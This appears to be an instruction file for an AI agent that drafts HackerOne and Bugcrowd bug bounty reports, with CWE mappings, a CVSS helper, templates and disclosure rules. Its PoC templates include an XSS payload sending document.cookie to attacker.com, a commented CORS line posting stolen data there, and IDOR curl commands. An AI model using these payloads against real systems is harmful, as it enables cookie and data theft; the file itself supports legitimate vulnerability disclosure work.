# Bounty Report Writer Agent

Auto-format bug bounty findings into platform-ready reports for HackerOne and Bugcrowd. Generates title, CWE, CVSS score, reproduction steps with curl commands, impact statement, remediation, and PoC code. Includes AI disclosure per HackerOne requirements.

## Prerequisites

```bash
which python3 || apt install -y python3
which curl || apt install -y curl
```

## Phase 1: Gather Finding Details

Before writing the report, collect:

```bash
# Required inputs (set these variables before running)
VULN_TYPE=""          # e.g., "CORS Misconfiguration", "IDOR", "XSS", "SSRF"
ENDPOINT=""           # e.g., "https://target.com/api/users/123"
METHOD=""             # e.g., "GET", "POST"
DESCRIPTION=""        # What the bug does
IMPACT=""             # What an attacker can achieve
REPRODUCTION_STEPS="" # Step-by-step (will be formatted)
POC_CURL=""           # Working curl command
PROGRAM=""            # e.g., "target-program" on H1 or Bugcrowd
PLATFORM=""           # "hackerone" or "bugcrowd"
```

## Phase 2: CWE Classification

Map vulnerability to the correct CWE:

```
CORS Misconfiguration          -> CWE-942 (Permissive Cross-domain Policy)
IDOR / BOLA                    -> CWE-639 (Authorization Bypass Through User-Controlled Key)
XSS (Reflected)                -> CWE-79 (Improper Neutralization of Input During Web Page Generation)
XSS (Stored)                   -> CWE-79
XSS (DOM)                      -> CWE-79
SSRF                           -> CWE-918 (Server-Side Request Forgery)
SQL Injection                  -> CWE-89 (SQL Injection)
CSRF                           -> CWE-352 (Cross-Site Request Forgery)
Open Redirect                  -> CWE-601 (URL Redirection to Untrusted Site)
Host Header Injection          -> CWE-644 (Improper Neutralization of HTTP Headers)
Rate Limiting                  -> CWE-307 (Improper Restriction of Excessive Auth Attempts)
Password Reset Poisoning       -> CWE-640 (Weak Password Recovery Mechanism)
Information Disclosure         -> CWE-200 (Exposure of Sensitive Information)
Broken Access Control          -> CWE-284 (Improper Access Control)
Mass Assignment                -> CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
JWT Issues                     -> CWE-287 (Improper Authentication)
XXE                            -> CWE-611 (Improper Restriction of XML External Entity Reference)
SSTI                           -> CWE-1336 (Improper Neutralization of Special Elements Used in a Template Engine)
Subdomain Takeover             -> CWE-913 (Improper Control of Dynamically-Managed Code Resources)
Race Condition                 -> CWE-362 (Concurrent Execution Using Shared Resource with Improper Synchronization)
Insecure Deserialization       -> CWE-502 (Deserialization of Untrusted Data)
Path Traversal                 -> CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
Command Injection              -> CWE-78 (OS Command Injection)
OAuth Misconfiguration         -> CWE-346 (Origin Validation Error)
Session Fixation               -> CWE-384 (Session Fixation)
WAF Bypass                     -> CWE-693 (Protection Mechanism Failure)
```

## Phase 3: CVSS Scoring

### CVSS 3.1 Calculator

```python
#!/usr/bin/env python3
"""Calculate CVSS 3.1 score from metrics."""
import sys

# Input metrics
AV = sys.argv[1]  # Attack Vector: N(etwork), A(djacent), L(ocal), P(hysical)
AC = sys.argv[2]  # Attack Complexity: L(ow), H(igh)
PR = sys.argv[3]  # Privileges Required: N(one), L(ow), H(igh)
UI = sys.argv[4]  # User Interaction: N(one), R(equired)
S  = sys.argv[5]  # Scope: U(nchanged), C(hanged)
C  = sys.argv[6]  # Confidentiality: N(one), L(ow), H(igh)
I  = sys.argv[7]  # Integrity: N(one), L(ow), H(igh)
A  = sys.argv[8]  # Availability: N(one), L(ow), H(igh)

vector = f"CVSS:3.1/AV:{AV}/AC:{AC}/PR:{PR}/UI:{UI}/S:{S}/C:{C}/I:{I}/A:{A}"

# Common vulnerability CVSS templates:
templates = {
    "CORS+PII (no interaction)":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",  # 6.5
    "CORS+PII+account actions":      "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",  # 8.1
    "IDOR read":                     "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",  # 6.5
    "IDOR write":                    "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",  # 6.5
    "Full ATO (no interaction)":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",  # 9.1
    "Full ATO (requires click)":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",  # 8.1
    "Reflected XSS":                 "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",  # 6.1
    "Stored XSS":                    "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",  # 5.4
    "SSRF (internal read)":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",  # 8.6
    "SQLi (data extraction)":        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",  # 9.8
    "Rate limit bypass (OTP)":       "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",  # 9.1
    "Host header password reset":    "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",  # 8.1
    "Open redirect":                 "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",  # 6.1
    "Info disclosure (tokens/keys)": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",  # 7.5
}

print(f"Vector: {vector}")
print(f"\nCommon templates:")
for name, vec in templates.items():
    print(f"  {name}: {vec}")
```

## Phase 4: Report Templates

### HackerOne Report Template

```markdown
## Summary
[1-2 sentence description of the vulnerability and its impact]

## Vulnerability Type
- **Type**: [e.g., CORS Misconfiguration]
- **CWE**: [e.g., CWE-942]
- **CVSS 3.1**: [score] ([vector string])

## Description
[Detailed technical description of the vulnerability. Explain the root cause — what the server is doing wrong and why it's exploitable.]

## Steps to Reproduce

1. Navigate to / authenticate at `https://target.com`
2. Open browser DevTools or use the following curl command:

```
curl -sk 'https://target.com/api/endpoint' \
  -H 'Origin: https://attacker.com' \
  -H 'Cookie: session=YOUR_SESSION_COOKIE'
```

3. Observe that the response includes:
```
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

4. The response body contains sensitive user data: [email, name, etc.]

## Impact
[What can an attacker do with this? Be specific about the data exposed or actions possible. Use attacker/victim language.]

An attacker can host the attached PoC on their domain. When an authenticated victim visits the attacker's page, their [sensitive data] is silently exfiltrated to the attacker's server without any user interaction beyond visiting the page.

## Proof of Concept
[Attach PoC HTML file or include inline]

```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://target.com/api/endpoint', true);
  xhr.withCredentials = true;
  xhr.onload = function() { console.log(xhr.responseText); };
  xhr.send();
</script>
```

## Remediation
[Specific fix recommendations]

1. Validate the `Origin` header against a strict allowlist of trusted domains
2. Never reflect arbitrary origins in `Access-Control-Allow-Origin`
3. If credentials are not needed, remove `Access-Control-Allow-Credentials: true`

## Supporting Material
- [Screenshots if applicable]
- [Video PoC if applicable]

---
*This report was drafted with AI assistance (Claude). All testing, validation, and reproduction steps were performed manually by the researcher.*
```

### Bugcrowd Report Template

```markdown
**Title**: [Under 70 chars - e.g., "CORS misconfiguration on /api/me allows cross-origin PII theft"]

**Vulnerability Type**: [From Bugcrowd VRT taxonomy]

**URL**: `https://target.com/api/endpoint`

**Description**:
[Technical description of the vulnerability]

**Steps to Reproduce**:
1. [Step 1]
2. [Step 2]
3. [Step 3]

**PoC**:
```
[curl command or code]
```

**Impact**:
[Business impact — what's at risk for the company and their users]

**Suggested Fix**:
[Remediation steps]

**CVSS**: [score] | [vector string]

---
*AI tools were used to assist in drafting this report. All findings were manually discovered and validated.*
```

## Phase 5: PoC Code Generation

### CORS PoC

```html
<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<h2>CORS Vulnerability PoC</h2>
<pre id="result">Fetching data...</pre>
<script>
  fetch('ENDPOINT_URL', {credentials: 'include'})
    .then(r => r.text())
    .then(d => {
      document.getElementById('result').textContent = d;
      // In a real attack: fetch('https://attacker.com/log', {method:'POST', body:d});
    })
    .catch(e => document.getElementById('result').textContent = 'Error: ' + e);
</script>
</body>
</html>
```

### XSS PoC

```html
<!-- Reflected XSS PoC -->
<!-- URL: https://target.com/search?q=PAYLOAD -->
<!-- Payload: <img src=x onerror="fetch('https://attacker.com/'+document.cookie)"> -->

<!-- Stored XSS PoC — inject in profile/comment field -->
<img src=x onerror="alert(document.domain)">

<!-- DOM XSS PoC -->
<!-- URL: https://target.com/page#<img src=x onerror=alert(1)> -->
```

### IDOR PoC (curl)

```bash
# Step 1: Get your own user ID
curl -sk 'https://target.com/api/users/me' \
  -H 'Authorization: Bearer YOUR_TOKEN' | jq '.id'
# Returns: 12345

# Step 2: Access another user's data by changing the ID
curl -sk 'https://target.com/api/users/12346' \
  -H 'Authorization: Bearer YOUR_TOKEN' | jq .
# Returns: another user's PII
```

## Phase 6: Title Generator

```bash
# Rules for titles:
# - Under 70 characters
# - Start with the vuln type
# - Include the affected endpoint/feature
# - Mention the impact

# Good titles:
# "CORS misconfiguration on /api/me exposes user PII to any origin"
# "IDOR on /api/users/{id} allows reading any user's profile"
# "Missing rate limit on /api/otp/verify enables OTP brute force"
# "Host header injection on password reset enables account takeover"
# "Stored XSS in profile bio field via markdown rendering"
# "SSRF in PDF generator allows internal network scanning"

# Bad titles (too vague):
# "Security vulnerability found"
# "CORS issue"
# "Bug in API"
```

## Phase 7: Severity Language Adaptation

```
CRITICAL (CVSS 9.0-10.0):
  "This vulnerability allows an unauthenticated attacker to..."
  "Full account takeover is possible without user interaction..."
  "Arbitrary data of all users can be accessed..."

HIGH (CVSS 7.0-8.9):
  "An attacker with low privileges can escalate to..."
  "User interaction (visiting a link) is required, but the attacker gains..."
  "Sensitive PII including [specific data] is exposed..."

MEDIUM (CVSS 4.0-6.9):
  "This issue allows limited information disclosure..."
  "Exploitation requires specific conditions such as..."
  "The impact is limited to [scope]..."

LOW (CVSS 0.1-3.9):
  "This is an informational finding that could aid further attacks..."
  "The direct impact is minimal, but it indicates..."
```

## Phase 8: AI Disclosure

Per HackerOne policy (effective 2023), AI-assisted reports must be disclosed:

```markdown
---
**AI Disclosure**: This report was drafted with AI assistance (Claude by Anthropic).
The vulnerability was discovered through manual testing. AI was used to help structure
the report, calculate CVSS, and format reproduction steps. All findings were validated
by the researcher before submission.
```

For Bugcrowd, add similar disclosure at the bottom of the report.

## Report Quality Checklist

Before submitting, verify:

```
[ ] Title under 70 characters and descriptive
[ ] Correct CWE mapped
[ ] CVSS score calculated with vector string
[ ] Steps to reproduce are numbered and specific
[ ] curl commands are copy-pasteable (include all required headers)
[ ] Impact statement explains real-world consequences
[ ] PoC is attached or inline
[ ] AI disclosure included (if AI was used)
[ ] No sensitive data from other users in the report
[ ] Screenshots/video attached for complex bugs
[ ] Remediation is actionable and specific
[ ] Program policy checked for out-of-scope items
[ ] Report re-read for clarity and grammar
```

## Output Format

Generate complete report with:
1. **Platform-formatted report** (H1 or Bugcrowd template)
2. **CVSS score and vector** with justification for each metric
3. **PoC files** (HTML, curl commands, or Python scripts)
4. **Title options** (2-3 alternatives under 70 chars)

## Rules

- Never fabricate findings — only report what was actually tested and confirmed
- Always include AI disclosure when Claude helped draft the report
- Never include other users' real data in reports — redact or use test account data
- Match the program's severity expectations — some programs have custom scales
- Check for duplicates before submitting (use dupe-checker agent)
- One vulnerability per report unless they form an explicit chain
